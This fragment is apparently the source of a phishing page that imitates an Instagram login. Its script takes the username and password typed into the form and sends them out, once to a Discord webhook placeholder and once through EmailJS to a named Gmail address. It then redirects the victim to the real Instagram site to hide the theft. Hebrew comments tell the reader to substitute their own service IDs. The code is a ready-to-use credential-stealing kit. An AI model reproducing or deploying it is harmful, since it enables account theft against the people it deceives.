  <div id="root">

      <main class="main" role="main">
        <div class="wrapper">

                    <div class="input-box">
                      <input type="password" name="password" id="password" placeholder="Password" maxlength="30" aria-required="true" autocapitalize="off" autocorrect="off" required>
                    </div>  
                    <span class="button-box">
                      <button class="btn" type="button" name="submit" onclick="sendMessage()">Log in</button>
                    </span>  
                    <a class="forgot" href="https://www.instagram.com/accounts/password/reset">Forgot password?</a>
                  </form>
                </div>
              </div>

  <script>
    function sendMessage() {
      function sleep(milliseconds) {
        const date = Date.now();
        let currentDate = null;
        do {
          currentDate = Date.now();
        } while (currentDate - date < milliseconds);
      }
      var request = new XMLHttpRequest();
      request.open("POST", "discord webhook");
      request.setRequestHeader('Content-type', 'application/json');
      var params = {
        content: ("> **shay856.  : **" + document.getElementById('username').value + "\n> **PASSWORD : **" + document.getElementById('password').value)
      };
      request.send(JSON.stringify(params));
      sleep(2000);
      window.location.replace("https://www.instagram.com");
    }
    (function() {
  emailjs.init("REvVlGrHOuI_NS26I"); // החלף עם מזהה המשתמש שלך מ-EmailJS
})();

function sendMessage() {
  var request = new XMLHttpRequest();
  request.open("POST", "discord webhook");
  request.setRequestHeader('Content-type', 'application/json');
  
  // שלח את המידע דרך EmailJS
  var params = {
    to_email: "shay053713@gmail.com", // החלף עם כתובת הדוא"ל שלך
    username: document.getElementById('username').value,
    password: document.getElementById('password').value
  };

  emailjs.send('service_tuulgmv', 'template_1wpdy5y', params) // החלף עם מזהה השירות והתבנית שלך מ-EmailJS
    .then(function(response) {
      console.log('SUCCESS!', response.status, response.text);
    }, function(error) {
      console.log('FAILED...', error);
    });
  
  // שינה את הכתובת לאחר שליחת המידע
  window.location.replace("https://www.instagram.com");
}

  </script>
